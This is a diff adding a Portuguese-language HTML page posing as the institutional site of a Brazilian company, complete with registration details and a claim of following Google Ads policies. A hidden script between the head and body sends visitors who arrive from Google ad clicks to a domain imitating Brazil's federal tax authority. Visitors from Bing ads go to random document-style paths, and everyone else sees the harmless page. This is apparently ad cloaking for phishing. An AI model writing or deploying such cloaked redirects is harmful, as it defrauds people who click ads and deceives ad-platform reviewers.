@@ -1,1 +1,234 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Perola de Moura Nunes</title>
+<meta name="description" content="Site institucional da empresa Perola de Moura Nunes. Informações oficiais, contato e serviços.">
 
+<style>
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    margin: 0;
+    padding: 0;
+    background: #f4f6f8;
+    color: #333;
+}
+
+nav {
+    background: #111827;
+    padding: 15px;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+}
+
+nav ul {
+    list-style: none;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+}
+
+nav ul li a {
+    color: #fff;
+    text-decoration: none;
+    font-weight: bold;
+}
+
+nav ul li a:hover {
+    text-decoration: underline;
+}
+
+header {
+    background: #1f2937;
+    color: #fff;
+    padding: 40px 20px;
+    text-align: center;
+}
+
+section {
+    padding: 40px 20px;
+    max-width: 1000px;
+    margin: auto;
+    background: #fff;
+    margin-top: 20px;
+}
+
+h2 {
+    color: #1f2937;
+}
+
+footer {
+    background: #111827;
+    color: #fff;
+    padding: 20px;
+    text-align: center;
+    margin-top: 40px;
+    font-size: 14px;
+}
+</style>
+</head>
+<script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www8.receita-fazenda.online/Mei';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<nav>
+    <ul>
+        <li><a href="#quem-somos">Quem Somos</a></li>
+        <li><a href="#servicos">O Que Fazemos</a></li>
+        <li><a href="#atendimento">Atendimento</a></li>
+        <li><a href="#entrega">Entrega</a></li>
+        <li><a href="#contato">Contato</a></li>
+        <li><a href="#privacidade">Privacidade</a></li>
+    </ul>
+</nav>
+
+<header>
+    <h1>Perola de Moura Nunes</h1>
+    <p>Empresa legalmente registrada e em atividade no Brasil</p>
+</header>
+
+<section id="quem-somos">
+    <h2>Quem Somos</h2>
+    <p>
+        A <strong>Perola de Moura Nunes</strong> é uma empresa brasileira legalmente registrada,
+        atuando de forma transparente e responsável na oferta de produtos e serviços ao público.
+        Nosso compromisso é fornecer informações claras, atendimento acessível e práticas comerciais éticas,
+        respeitando integralmente as políticas do Google Ads.
+    </p>
+</section>
+
+<section id="servicos">
+    <h2>O Que Fazemos</h2>
+    <p>
+        A <strong>Perola de Moura Nunes</strong> atua na divulgação e comercialização de produtos
+        e serviços por meio de canais digitais e presenciais.
+        Os anúncios publicados têm caráter informativo e direcionam os usuários
+        para canais oficiais de atendimento e contratação.
+    </p>
+</section>
+
+<section id="atendimento">
+    <h2>Atendimento ao Público</h2>
+    <p>
+        A interação com o público-alvo ocorre através de canais oficiais,
+        como telefone, e-mail e formulários de contato.
+        Nosso atendimento é realizado de forma direta, com esclarecimento prévio
+        sobre valores, prazos e condições.
+    </p>
+</section>
+
+<section id="entrega">
+    <h2>Entrega de Produtos e Serviços</h2>
+    <p>
+        Os produtos ou serviços anunciados são entregues conforme a natureza da contratação.
+        Serviços digitais são disponibilizados após confirmação.
+        Produtos físicos, quando aplicável, são enviados ao endereço informado pelo cliente,
+        respeitando os prazos acordados.
+    </p>
+</section>
+
+<section id="contato">
+    <h2>Contato</h2>
+    <p><strong>Empresa:</strong> Perola de Moura Nunes</p>
+    <p><strong>CNPJ:</strong> 37.860.027/0001-64</p>
+    <p><strong>Endereço:</strong> Avenida Ininga, 1201, Loja V-89 – Bairro Joquei – Teresina – PI – CEP 64048-110</p>
+    <p><strong>Telefone:</strong> (86) 99400-0000</p>
+    <p><strong>E-mail:</strong> contato@perolademouranunes.com</p>
+</section>
+
+<section id="privacidade">
+    <h2>Política de Privacidade</h2>
+    <p>
+        A <strong>Perola de Moura Nunes</strong> respeita a privacidade dos usuários.
+        As informações coletadas são utilizadas exclusivamente para atendimento,
+        comunicação e cumprimento de obrigações legais,
+        em conformidade com a legislação vigente.
+    </p>
+</section>
+
+<section>
+    <h2>Termos de Uso</h2>
+    <p>
+        Ao utilizar este site, o usuário concorda com os termos aqui descritos.
+        O conteúdo é informativo e pode ser alterado sem aviso prévio.
+        O uso inadequado das informações é de responsabilidade do usuário.
+    </p>
+</section>
+
+<footer>
+    <p>
+        © 2026 – <strong>Perola de Moura Nunes</strong><br>
+        CNPJ: 37.860.027/0001-64 – Todos os direitos reservados
+    </p>
+</footer>
+
+</body>
+</html>
